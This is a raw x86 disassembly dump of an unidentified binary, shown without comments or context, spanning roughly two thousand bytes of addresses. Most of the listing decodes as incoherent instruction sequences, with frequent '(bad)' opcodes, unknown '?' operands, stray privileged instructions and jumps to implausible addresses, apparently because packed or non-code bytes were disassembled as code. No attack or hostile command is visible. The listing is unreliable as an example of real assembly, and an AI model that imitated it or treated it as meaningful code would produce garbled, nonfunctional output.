  43296f:	jb     0x432979
  432971:	mov    ecx,DWORD PTR [ebp-0x8]
  432974:	mov    edi,edi
  432976:	xor    edx,DWORD PTR [eax]
  432978:	add    edi,DWORD PTR [ebx]
  43297a:	mov    DWORD PTR [ebp-0x10],edi
  43297d:	inc    edi
  43297e:	pop    ebp
  43297f:	jge    0x4329bc
  432981:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432985:	mov    edx,0xc05d87f0
  43298a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  43298e:	fimul  WORD PTR [eax]
  432990:	fist   WORD PTR [ebp+0x1c]
  432993:	in     al,dx
  432994:	jne    0x432982
  432996:	mov    edi,DWORD PTR [edx-0x7a27a10]
  43299c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  4329a0:	fdivp  st(0),st
  4329a2:	fild   WORD PTR [ebp+0x4510f85c]
  4329a8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  4329ae:	inc    ebp
  4329af:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  4329b5:	mov    ebp,DWORD PTR [ebx-0x4]
  4329b8:	adc    al,0x8b
  4329ba:	rcl    DWORD PTR [eax],0x48
  4329bd:	mov    esi,0x7080803
  4329c2:	fiadd  WORD PTR [ebp+0x4d]
  4329c5:	mov    WORD PTR [ebx+0x558bfc52],cs
  4329cb:	cld    
  4329cc:	xor    ebx,DWORD PTR [ebx+0x330103]
  4329d2:	mov    DWORD PTR [edi+0x872dc],edi
  4329d8:	xlat   BYTE PTR ds:[ebx]
  4329d9:	into   
  4329da:	ffreep st(6)
  4329dc:	retf   0x6c7
  4329df:	iret   
  4329e0:	dec    ebp
  4329e1:	inc    ebp
  4329e2:	mov    DWORD PTR [ebx],edi
  4329e4:	fmul   QWORD PTR [edi]
  4329e6:	dec    ebp
  4329e7:	jnp    0x432a1c
  4329e9:	add    BYTE PTR [ebx],al
  4329eb:	mov    ecx,DWORD PTR [esp+edi*8]
  4329ee:	inc    ebp
  4329ef:	dec    ebp
  4329f0:	lea    esi,[ebx]
  4329f2:	add    DWORD PTR [ebx],eax
  4329f4:	jb     0x432a31
  4329f6:	add    BYTE PTR [edi],cl
  4329f8:	inc    ebp
  4329f9:	imul   eax,edi,0x858bd800
  4329ff:	cld    
  432a00:	clc    
  432a01:	mov    DWORD PTR [ebp+0x0],eax
  432a04:	inc    DWORD PTR [eax]
  432a06:	or     al,0xde
  432a08:	sbb    bh,0x1
  432a0b:	retf   
  432a0c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432a13:	dec    ebp
  432a14:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432a1a:	enter  0x12de,0xdf
  432a1e:	inc    ebp
  432a1f:	pop    ebp
  432a20:	dec    DWORD PTR [ebx-0x257f0ff4]
  432a26:	add    DWORD PTR [edx],edx
  432a28:	add    BYTE PTR [ebp+0x50],dl
  432a2b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432a31:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432a37:	or     ah,al
  432a39:	pop    ss
  432a3a:	cdq    
  432a3b:	push   ebp
  432a3c:	clc    
  432a3d:	mov    eax,DWORD PTR [ebp-0x4]
  432a40:	xor    edx,edx
  432a42:	add    esi,DWORD PTR [ebx]
  432a44:	cmp    eax,DWORD PTR [ebx]
  432a46:	hlt    
  432a47:	cmp    DWORD PTR [ebx],esp
  432a49:	or     al,BYTE PTR [ebp+0xf]
  432a4c:	mov    eax,DWORD PTR [edx]
  432a4e:	loopne 0x432a50
  432a50:	(bad)  
  432a51:	mov    ecx,esi
  432a53:	cld    
  432a54:	pushf  
  432a55:	pop    ebp
  432a56:	cdq    
  432a57:	mov    esi,DWORD PTR [edx]
  432a59:	lock mov eax,eax
  432a5c:	adc    BYTE PTR [ebx],al
  432a5e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432a65:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432a6b:	dec    ebp
  432a6c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432a72:	(bad)  
  432a73:	iret   
  432a74:	inc    ebp
  432a75:	(bad)  
  432a76:	jne    0x432ac5
  432a78:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432a7e:	(bad)  
  432a7f:	cmp    ebx,eax
  432a81:	je     0x432a09
  432a83:	add    edi,edi
  432a85:	or     bh,bh
  432a87:	dec    ebp
  432a88:	inc    ebp
  432a89:	mov    esi,DWORD PTR [ebx]
  432a8b:	cld    
  432a8c:	add    ecx,esi
  432a8e:	cmp    ecx,DWORD PTR [eax-0xc]
  432a91:	mov    edx,DWORD PTR [edi]
  432a93:	or     BYTE PTR [ebp-0x7c],al
  432a96:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432a9c:	test   BYTE PTR [ecx+ebx*4],cl
  432a9f:	inc    ebp
  432aa0:	xor    bh,BYTE PTR ds:0x8be89c89
  432aa6:	out    dx,eax
  432aa7:	adc    BYTE PTR [eax],al
  432aa9:	jne    0x432a72
  432aab:	mov    ebp,esp
  432aad:	fcomp  DWORD PTR [ebx]
  432aaf:	add    BYTE PTR [ecx],al
  432ab1:	inc    DWORD PTR [ebp-0x75]
  432ab4:	mov    esp,?
  432ab6:	add    al,0xce
  432ab8:	mov    ecx,edi
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	fidivr WORD PTR [ebx]
  432abe:	fbstp  TBYTE PTR [ebp-0x3e]
  432ac1:	mov    eax,DWORD PTR [eax]
  432ac3:	adc    BYTE PTR [ebx-0x3974038b],cl
  432ac9:	fadd   st,st(7)
  432acb:	add    BYTE PTR [ebp-0x1],al
  432ace:	mov    ecx,DWORD PTR [esp+edi*8]
  432ad1:	inc    ebp
  432ad2:	mov    bh,0xc7
  432ad5:	loopne 0x432b1c
  432ad7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432add:	add    DWORD PTR [ebx],esi
  432adf:	pushf  
  432ae0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432ae6:	mov    eax,edi
  432ae8:	cwde   
  432ae9:	inc    ebp
  432aea:	inc    ebp
  432aeb:	jne    0x432a78
  432aed:	mov    esp,esp
  432aef:	clc    
  432af0:	add    al,0x4d
  432af2:	mov    DWORD PTR [ebx],esi
  432af4:	or     al,0x33
  432af6:	inc    ebp
  432af7:	lea    ecx,[ebx-0x398d13fd]
  432afd:	add    bh,al
  432aff:	inc    ebp
  432b00:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432b07:	add    ebp,esp
  432b09:	shufps xmm1,xmm3,0xc7
  432b0d:	(bad)  
  432b0e:	jmp    0x74886637
  432b13:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432b19:	hlt    
  432b1a:	mov    ecx,DWORD PTR [edi]
  432b1c:	fadd   DWORD PTR [ebp+0x0]
  432b1f:	xor    ecx,DWORD PTR [edi]
  432b21:	add    ecx,ecx
  432b23:	cmp    edi,edi
  432b25:	pmuludq mm7,QWORD PTR [edx+0x50]
  432b29:	(bad)  
  432b2a:	jmp    0x432ab7
  432b2c:	mov    edi,esp
  432b2e:	or     al,0xc6
  432b30:	inc    ebp
  432b31:	(bad)  
  432b32:	mov    eax,DWORD PTR [ebp+0x10]
  432b35:	jne    0x432ac0
  432b37:	mov    eax,DWORD PTR [ecx]
  432b39:	clc    
  432b3a:	add    BYTE PTR [ebp-0x40],cl
  432b3d:	xor    edx,DWORD PTR [eax-0x73]
  432b40:	jne    0x432b43
  432b42:	push   DWORD PTR [edx+0x8]
  432b45:	add    BYTE PTR [ebp+0x45],al
  432b48:	mov    ebp,ecx
  432b4a:	cld    
  432b4b:	add    BYTE PTR [ebp+0x0],cl
  432b4e:	xor    eax,DWORD PTR [ebp+0x3]
  432b51:	mov    ?,WORD PTR [ebx]
  432b53:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432b59:	sub    eax,0x5d330e4d
  432b5e:	lea    esi,[ebx]
  432b60:	add    DWORD PTR [ebx],eax
  432b62:	jb     0x432b4d
  432b64:	add    BYTE PTR [eax],al
  432b66:	inc    ebp
  432b67:	add    bl,ch
  432b69:	inc    ebp
  432b6a:	mov    esi,DWORD PTR [ebx]
  432b6c:	or     al,0x3
  432b6e:	(bad)  
  432b6f:	mov    edi,eax
  432b71:	in     al,dx
  432b72:	scas   eax,DWORD PTR es:[edi]
  432b73:	inc    ebp
  432b74:	mov    esi,DWORD PTR [ebx]
  432b76:	in     al,0x3
  432b78:	add    al,0x89
  432b7a:	mov    ecx,DWORD PTR [eax+edi*8]
  432b7d:	dec    ebp
  432b7e:	(bad)  
  432b7f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432b86:	mov    ecx,eax
  432b88:	cld    
  432b89:	push   es
  432b8a:	dec    ebp
  432b8b:	add    al,0x33
  432b8d:	mov    DWORD PTR [ebx],eax
  432b8f:	in     al,dx
  432b90:	cmp    DWORD PTR [ebp-0x67],eax
  432b93:	mov    eax,DWORD PTR [ebp-0xba0068]
  432b99:	mov    edx,DWORD PTR [ebp-0x4]
  432b9c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432b9f:	xor    eax,DWORD PTR [ebp+0x3]
  432ba2:	cmp    DWORD PTR [ebx],0x8b327498
  432ba8:	xor    edi,esp
  432baa:	jmp    0xff7728fc
  432baf:	add    ecx,DWORD PTR [ebp-0x3f]
  432bb2:	xor    ebx,DWORD PTR [edi]
  432bb4:	add    eax,ecx
  432bb6:	cmp    ebx,DWORD PTR [eax]
  432bb8:	mov    ecx,DWORD PTR [ebp-0x4]
  432bbb:	mov    ecx,DWORD PTR [eax]
  432bbd:	adc    BYTE PTR [ebp-0x80],al
  432bc0:	jmp    0x432bc3
  432bc2:	mov    eax,DWORD PTR [eax]
  432bc4:	cld    
  432bc5:	mov    bh,0xc6
  432bc7:	push   ecx
  432bc8:	(bad)  
  432bc9:	jne    0x432c29
  432bcb:	dec    ecx
  432bcd:	or     BYTE PTR [ecx+ebx*1],cl
  432bd0:	push   ebp
  432bd1:	inc    ebp
  432bd2:	in     al,dx
  432bd3:	add    ebp,esp
  432bd5:	or     bh,al
  432bd7:	dec    ebp
  432bd8:	cld    
  432bd9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432bdf:	cmp    DWORD PTR [ecx],0x2
  432be2:	pushf  
  432be3:	dec    DWORD PTR [ebx+0x45510cf4]
  432be9:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432bef:	mov    edx,DWORD PTR [ecx+0xc]
  432bf2:	xor    eax,esi
  432bf4:	mov    edx,0xc172c7
  432bf9:	inc    ebp
  432bfa:	mov    esi,DWORD PTR [ebp+0x8]
  432bfd:	mov    eax,edx
  432bff:	call   0x84c7f2f4
  432c04:	add    DWORD PTR [ecx-0x76bace00],ebx
  432c0a:	mov    ebp,eax
  432c0c:	or     BYTE PTR [eax],dl
  432c0e:	jo     0x432c5d
  432c10:	push   edi
  432c11:	xor    esi,DWORD PTR [ebp+0x3]
  432c14:	(bad)  
  432c15:	pmulhuw mm0,mm1
  432c18:	test   DWORD PTR [ebp-0x8],ecx
  432c1b:	mov    DWORD PTR [ebp-0x67],eax
  432c1e:	mov    eax,DWORD PTR [ebp-0x4]
  432c21:	xor    edi,DWORD PTR [ebp-0x73]
  432c24:	xor    eax,DWORD PTR [ebx]
  432c26:	xor    esi,DWORD PTR [edx+0x3]
  432c29:	add    BYTE PTR [ecx],bh
  432c2b:	inc    ebp
  432c2c:	(bad)  
  432c2d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432c33:	mov    DWORD PTR [eax],0x750f0004
  432c39:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432c3f:	lock add BYTE PTR [ebp+0x0],cl
  432c43:	mov    esi,DWORD PTR [ebp-0x18]
  432c46:	mov    ebp,edx
  432c48:	or     al,0x72
  432c4a:	ja     0x432c4c
  432c4c:	mov    edx,esi
  432c4e:	cld    
  432c4f:	(bad)  
  432c52:	cli    
  432c53:	mov    esi,DWORD PTR [ebp-0x4]
  432c56:	cmp    ecx,esi
  432c58:	bswap  edi
  432c5a:	(bad)
  432c5e:	mov    esi,DWORD PTR [ebp-0x4]
  432c61:	mov    esi,ecx
  432c63:	clc    
  432c64:	repnz add esi,DWORD PTR [ebp+0x45]
  432c68:	push   ebx
  432c69:	xor    eax,DWORD PTR [ebp+0x3]
  432c6c:	cmp    ebx,DWORD PTR [edi-0x64]
  432c6f:	pop    ebx
  432c70:	jmp    0x432d37
  432c75:	mov    esi,DWORD PTR [ebp-0x7d]
  432c78:	xor    ebp,DWORD PTR [eax]
  432c7a:	lea    eax,[ebp-0x8]
  432c7d:	ss repnz pushf 
  432c80:	out    dx,eax
  432c81:	(bad)  
  432c82:	neg    eax
  432c84:	ins    DWORD PTR es:[edi],dx
  432c85:	test   esi,edi
  432c87:	clc    
  432c88:	pop    esp
  432c89:	inc    ebp
  432c8a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432c90:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432c96:	add    cl,al
  432c98:	jne    0x432c33
  432c9a:	mov    esi,DWORD PTR [edx]
  432c9c:	in     al,dx
  432c9d:	push   esi
  432c9e:	xor    BYTE PTR [ebp-0xe],dh
  432ca1:	add    edi,esi
  432ca3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432ca9:	add    cl,bh
  432cab:	mov    edi,DWORD PTR [ebp+0x8]
  432cae:	mov    DWORD PTR [ebp-0x14],esi
  432cb1:	add    esi,DWORD PTR [ebp+0x3c]
  432cb4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432cba:	mov    ah,0x3d
  432cbc:	cdq    
  432cbd:	pushf  
  432cbe:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432cc4:	jne    0x432c51
  432cc6:	mov    ecx,DWORD PTR [esp+ebp*8]
  432cc9:	icebp  
  432cca:	icebp  
  432ccb:	shl    edx,0xf2
  432cce:	(bad)  
  432ccf:	mov    ah,0x16
  432cd1:	inc    eax
  432cd2:	jne    0x432c67
  432cd4:	mov    ecx,DWORD PTR [edi]
  432cd6:	in     al,dx
  432cd7:	jmp    0x432cca
  432cd9:	add    dl,dh
  432cdb:	mov    edi,esi
  432cdd:	or     al,0x8
  432cdf:	inc    ebp
  432ce0:	jne    0x432ce5
  432ce2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432ce8:	ret    
  432ce9:	or     bh,bh
  432ceb:	jge    0x432cd5
  432ced:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432cf3:	xor    edi,eax
  432cf5:	add    esi,DWORD PTR [ebp-0x77]
  432cf8:	mov    ebx,esp
  432cfa:	clc    
  432cfb:	neg    DWORD PTR [ebp-0x7c]
  432cfe:	xor    eax,DWORD PTR [eax]
  432d00:	cmp    eax,DWORD PTR [eax]
  432d02:	repz jne 0x432c9a
  432d05:	xor    eax,DWORD PTR [ecx]
  432d07:	add    ebx,DWORD PTR [eax]
  432d09:	mov    DWORD PTR [ebp-0x8],eax
  432d0c:	mov    eax,edi
  432d0e:	cld    
  432d0f:	lock pop eax
  432d11:	test   DWORD PTR [ebx],esi
  432d13:	clc    
  432d14:	add    edx,DWORD PTR [edi-0x740bff77]
  432d1a:	fdivp  st(4),st
  432d1c:	test   ecx,esi
  432d1e:	(bad)  
  432d1f:	jnp    0x432d20
  432d21:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432d27:	jae    0x432cb4
  432d29:	sub    edi,esp
  432d2b:	(bad)  
  432d2c:	shl    DWORD PTR [eax-0x3e],0x89
  432d30:	leave  
  432d31:	call   0x8198e43e
  432d36:	in     al,dx
  432d37:	(bad)  
  432d38:	in     al,dx
  432d39:	add    bh,al
  432d3b:	mov    esp,edi
  432d3d:	in     al,dx
  432d3e:	test   DWORD PTR [ebp-0x8],edi
  432d41:	mov    eax,DWORD PTR [ebp+0x2b]
  432d44:	cmp    DWORD PTR [ebx],eax
  432d46:	pushf  
  432d47:	jnp    0x57322980
  432d4d:	xor    edx,DWORD PTR [ecx-0x77]
  432d50:	push   ecx
  432d51:	loopne 0x432d86
  432d53:	jne    0x432d10
  432d55:	mov    esi,DWORD PTR [edx-0x20]
  432d58:	add    BYTE PTR [ebp-0x3d],bh
  432d5b:	xor    eax,DWORD PTR [ebp-0x73]
  432d5e:	mov    edi,DWORD PTR [esi]
  432d60:	cld    
  432d61:	jb     0x432d29
  432d63:	add    bl,al
  432d65:	jne    0x432dac
  432d67:	mov    edx,DWORD PTR [edi-0x10]
  432d6a:	jge    0x432de9
  432d6c:	mov    esi,DWORD PTR [ebx]
  432d6e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432d72:	xor    esi,DWORD PTR [ebp-0x77]
  432d75:	mov    esi,eax
  432d77:	lock inc ebp
  432d79:	jge    0x432db1
  432d7b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432d82:	dec    ebp
  432d83:	mov    esi,DWORD PTR [ebx]
  432d85:	loopne 0x432d10
  432d87:	jge    0x432d81
  432d89:	add    DWORD PTR [ebp-0x7d],eax
  432d8c:	test   BYTE PTR [edx],0x9c
  432d8f:	dec    ebp
  432d90:	mov    esi,DWORD PTR [ebp-0xc]
  432d93:	mov    ecx,DWORD PTR [ebp-0xc]
  432d96:	xor    ebx,DWORD PTR [ebp-0x77]
  432d99:	mov    esi,esp
  432d9b:	in     al,0x45
  432d9d:	jge    0x432dd9
  432d9f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432da6:	dec    ebp
  432da7:	inc    esp
  432da8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432dae:	inc    ebp
  432daf:	hlt    
  432db0:	ss jne 0x432d52
  432db3:	mov    edi,DWORD PTR [eax+0xf19504]
  432db9:	repnz mov DWORD PTR [ebp+0x20],ebx
  432dbd:	cmp    eax,DWORD PTR [ebp+0xf]
  432dc0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432dc4:	fistp  WORD PTR [ebx+0x0]
  432dc7:	inc    ebp
  432dc8:	mov    ebx,DWORD PTR [edi+0xc]
  432dcb:	add    eax,eax
  432dcd:	inc    ebp
  432dce:	test   BYTE PTR [ebx],dh
  432dd0:	add    eax,DWORD PTR [ebx]
  432dd2:	add    BYTE PTR [esi+0x45],bl
  432dd5:	ret    0x85
  432dd8:	jnp    0x5443b1a7
  432dde:	inc    bp
  432de0:	inc    ebp
  432de1:	ss mov ecx,0xc78a9c
  432de7:	fdiv   QWORD PTR [ebx]
  432de9:	test   DWORD PTR [ecx+0x453af8],edi
  432def:	push   ebx
  432df0:	add    edi,DWORD PTR [esi+0x708088b]
  432df6:	cmp    esi,eax
  432df8:	setns  BYTE PTR [ecx-0x74fcffce]
  432dff:	mov    esp,edi
  432e01:	call   0x33ce7353
  432e06:	or     BYTE PTR [ebx],al
  432e08:	inc    ecx
  432e09:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432e0f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432e15:	lock add cl,al
  432e18:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432e1f:	mov    ch,0x45
  432e21:	clc    
  432e22:	xor    eax,DWORD PTR [ebp+0x3]
  432e25:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432e2b:	inc    ebp
  432e2c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432e32:	mov    edi,eax
  432e34:	mov    eax,DWORD PTR [ebp+0x3c]
  432e37:	mov    ecx,DWORD PTR [eax]
  432e39:	hlt    
  432e3a:	inc    ebp
  432e3b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432e42:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432e48:	push   ebp
  432e49:	mov    edi,DWORD PTR [ebx]
  432e4b:	in     al,dx
  432e4c:	jne    0x432e0f
  432e4e:	mov    eax,DWORD PTR [ebp-0x28]
  432e51:	add    DWORD PTR [eax],0xe8058dec
  432e57:	clc    
  432e58:	mov    esi,DWORD PTR [edi-0x8]
  432e5b:	add    dh,dl
  432e5d:	rol    WORD PTR [ebp-0x1],cl
  432e61:	mov    edx,DWORD PTR [eax+0x8]
  432e64:	jne    0x432e26
  432e66:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432e6d:	inc    ebp
  432e6e:	push   esp
  432e6f:	test   DWORD PTR [ecx+0xf],ecx
  432e72:	sub    edx,esp
  432e74:	add    eax,DWORD PTR [eax]
  432e76:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432e7c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432e83:	mov    eax,DWORD PTR [ecx]
  432e85:	and    BYTE PTR [eax],al
  432e87:	cmp    BYTE PTR [eax],dl
  432e89:	add    BYTE PTR [ebp+0x66],al
  432e8c:	inc    ecx
  432e8e:	push   esp
  432e8f:	(bad)  
  432e90:	jne    0x432e92
  432e92:	push   edx
  432e93:	enterw 0xc1,0x4d
  432e98:	mov    esp,DWORD PTR [esi+0x20]
  432e9b:	add    DWORD PTR [ecx-0x7b],eax
  432e9e:	add    eax,DWORD PTR [ebx]
  432ea0:	str    WORD PTR [eax+0x45]
  432ea4:	lea    ecx,[ebx+0x45890801]
  432eaa:	sbb    BYTE PTR [ebx],al
  432eac:	dec    ebp
  432ead:	cmp    al,0xf
  432eaf:	inc    ebp
  432eb0:	push   eax
  432eb1:	mov    esi,DWORD PTR [ebx]
  432eb3:	push   eax
  432eb4:	add    eax,eax
  432eb6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432ebd:	inc    ebp
  432ebe:	add    BYTE PTR [esi],dh
  432ec0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432ec7:	(bad)  
  432ec8:	mov    ebx,eax
  432eca:	loopne 0x432f11
  432ecc:	dec    ebp
  432ecd:	mov    ecx,DWORD PTR [edi]
  432ecf:	cld    
  432ed0:	push   eax
  432ed1:	xchg   DWORD PTR [ebx],esi
  432ed3:	add    DWORD PTR [ebx],ebp
  432ed5:	add    BYTE PTR [ebx],ch
  432ed7:	or     BYTE PTR [ecx],bh
  432ed9:	dec    ecx
  432eda:	loopne 0x432edf
  432edc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432ee2:	push   ebp
  432ee3:	add    DWORD PTR [ebx+0x55100800],eax
  432ee9:	dec    ebp
  432eea:	jmp    0x432e75
  432eec:	mov    esp,DWORD PTR [eax]
  432eee:	sbb    dl,dl
  432ef0:	inc    eax
  432ef1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432ef7:	add    BYTE PTR [ebx+0x74528555],cl
  432efd:	push   ebp
  432efe:	div    DWORD PTR [ebx]
  432f00:	and    eax,DWORD PTR [ebx]
  432f02:	add    edx,DWORD PTR [edx-0x30]
  432f05:	jno    0x432e92
  432f07:	inc    DWORD PTR [eax+eiz*1]
  432f0a:	inc    ebp
  432f0b:	push   eax
  432f0c:	push   eax
  432f0d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432f13:	mov    edi,esp
  432f15:	push   eax
  432f16:	inc    ebp
  432f17:	enter  0x458b,0x8
  432f1b:	push   ecx
  432f1c:	(bad)  
  432f1d:	call   0x10d38f5
  432f22:	pop    ss
  432f23:	push   ebp
  432f24:	mov    ecx,DWORD PTR [ebx+0x489408]
  432f2a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432f30:	push   ecx
  432f31:	jo     0x432f1b
  432f33:	inc    DWORD PTR [edi]
  432f35:	or     BYTE PTR [eax],al
  432f37:	call   0xce3681
  432f3c:	fmul   QWORD PTR [ebp+0x55]
  432f3f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432f45:	mov    bh,0x8c
  432f47:	adc    al,0x99
  432f49:	dec    esp
  432f4a:	xor    bl,BYTE PTR [eax]
  432f4c:	mov    ecx,DWORD PTR [ebp+0xc]
  432f4f:	mov    eax,DWORD PTR [ebp-0x4]
  432f52:	mov    esi,DWORD PTR [edi-0x3148f924]
  432f58:	push   es
  432f59:	retf   
  432f5a:	mov    BYTE PTR [ebp-0x30],0x3b
  432f5e:	inc    ebp
  432f5f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432f66:	retf   0x83fc
  432f69:	into   
  432f6a:	dec    ebp
  432f6b:	retf   
  432f6c:	mov    ecx,DWORD PTR [ebp-0x74]
  432f6f:	mov    eax,DWORD PTR [eax]
  432f71:	fdiv   QWORD PTR [ebx]
  432f73:	mov    bh,0x3
  432f75:	push   es
  432f76:	mov    esi,ecx
  432f78:	sbb    cl,dl
  432f7a:	dec    ebp
  432f7b:	sar    DWORD PTR [ebx],cl
  432f7d:	push   ebp
  432f7e:	jne    0x432f8f
  432f80:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432f86:	lea    ebx,[eax]
  432f88:	call   0xf4ccbb4f
  432f8d:	sbb    dh,dl
  432f8f:	add    edx,ebx
  432f91:	push   ebp
  432f92:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432f98:	push   ecx
  432f99:	mov    DWORD PTR [eax-0x30],edx
  432f9c:	test   DWORD PTR [edx],eax
  432f9e:	xadd   esp,esi
  432fa1:	pop    es
  432fa2:	add    cl,dl
  432fa4:	mov    eax,ecx
  432fa6:	or     al,0x45
  432fa8:	(bad)  
  432fa9:	push   eax
  432faa:	add    DWORD PTR [edx+0x0],eax
  432fad:	add    ecx,DWORD PTR [ecx]
  432faf:	and    dh,cl
  432fb1:	call   0xc73881
  432fb6:	add    DWORD PTR [ebp+0x0],edx
  432fb9:	mov    esp,DWORD PTR [ebp+0x18]
  432fbc:	add    BYTE PTR [eax+0x48],cl
  432fbf:	xor    eax,DWORD PTR [eax]
  432fc1:	add    esp,DWORD PTR [esi+0x3b]
  432fc4:	inc    ebp
  432fc5:	je     0x432f4a
  432fc7:	push   ecx
  432fc8:	push   es
  432fc9:	dec    ebp
  432fca:	mov    DWORD PTR [ebx],eax
  432fcc:	(bad)  
  432fcd:	or     al,0x5e
  432fcf:	inc    eax
  432fd0:	add    BYTE PTR [ebx],al
  432fd2:	data16 and BYTE PTR [ebp+0x50],al
  432fd6:	sub    DWORD PTR [ecx],0xfffffff8
  432fd9:	add    BYTE PTR [ebp-0x75],ah
  432fdc:	add    BYTE PTR [eax],bl
  432fde:	enter  0x894d,0x8b
  432fe2:	int3   
  432fe3:	loopne 0x43301f
  432fe5:	rol    BYTE PTR [eax],0x33
  432fe8:	lea    cx,[ebp+0xa]
  432fec:	data16 jb 0x433034
  432fef:	add    BYTE PTR [ebx+0x44890855],cl
  432ff5:	sbb    ah,al
  432ff7:	inc    ebp
  432ff8:	cmp    BYTE PTR [edi],cl
  432ffa:	add    BYTE PTR [edx+0x66],dl
  432ffd:	xor    ecx,DWORD PTR [eax]
  432fff:	sub    edi,esi
  433001:	mov    eax,DWORD PTR [eax]
  433003:	or     al,0x66
  433005:	ror    edx,cl
  433007:	dec    ebp
  433008:	inc    ebp
  433009:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43300f:	cld    
  433010:	or     BYTE PTR [edi+0x4501dd],dl
  433016:	ret    0xe8ce
  433019:	retf   
  43301a:	(bad)  
  43301b:	dec    ebp
  43301c:	mov    al,0x8b
  43301e:	in     al,dx
  43301f:	and    BYTE PTR [ebx],bh
  433021:	or     al,BYTE PTR [ebp+0x27]
  433024:	in     al,dx
  433025:	xchg   eax,ebp
  433027:	add    edi,eax
  433029:	add    BYTE PTR [eax+0x3f52ed55],bh
  43302f:	push   ebp
  433030:	inc    ebp
  433031:	xor    ebx,edx
  433033:	add    ebp,eax
  433035:	push   edx
  433036:	push   bp
  433038:	inc    ebp
  433039:	(bad)  
  43303a:	jmp    0xc342f693
  43303f:	sbb    al,0x33
  433041:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  433048:	add    BYTE PTR [ebp+0x44],0x8b
  43304c:	jmp    0xf98b:0x100041c8
  433053:	xor    esi,DWORD PTR [edx+0x3]
  433056:	mov    ecx,DWORD PTR [edi]
  433058:	fmul   DWORD PTR [edx]
  43305a:	add    BYTE PTR [eax],al
  43305c:	lea    eax,[ebx-0x4700273c]
  433062:	add    al,0x4f
  433064:	pop    DWORD PTR [eax]
  433066:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43306c:	push   edx
  43306d:	inc    WORD PTR [ebp+0x8]
  433071:	mov    eax,0x514f4d
  433076:	(bad)
  43307a:	add    al,al
  43307c:	xor    DWORD PTR [ebx-0x74baf730],eax
  433082:	test   DWORD PTR [esi+0x74],esp
  433085:	inc    ebp
  433086:	mov    DWORD PTR [eax+0xa4f08],edi
  43308c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433092:	or     dh,cl
  433094:	or     eax,0x8b8d5045
  433099:	inc    ebp
  43309a:	mov    WORD PTR [ecx+0x3b8a00],?
  4330a0:	jne    0x4330d5
  4330a2:	mov    edi,DWORD PTR [edx+0x8f3a18]
  4330a8:	add    DWORD PTR [ebx],eax
  4330aa:	add    bh,bh
  4330ac:	adc    DWORD PTR [eax],ecx
  4330ae:	adc    DWORD PTR [ebp+0x55],edi
  4330b1:	push   es
  4330b2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4330b8:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  4330bf:	inc    ebp
  4330c0:	mov    esp,edi
  4330c2:	or     al,0xda
  4330c4:	push   eax
  4330c5:	(bad)  
  4330c6:	jne    0x43307c
  4330c8:	call   0x3b29b7
  4330cd:	inc    ebp
  4330ce:	rol    ah,0x84
  4330d1:	call   0xbc43f7d6
  4330d6:	jne    0x4330b2
  4330d8:	mov    ebx,ebx
  4330da:	inc    edi
  4330dc:	and    al,al
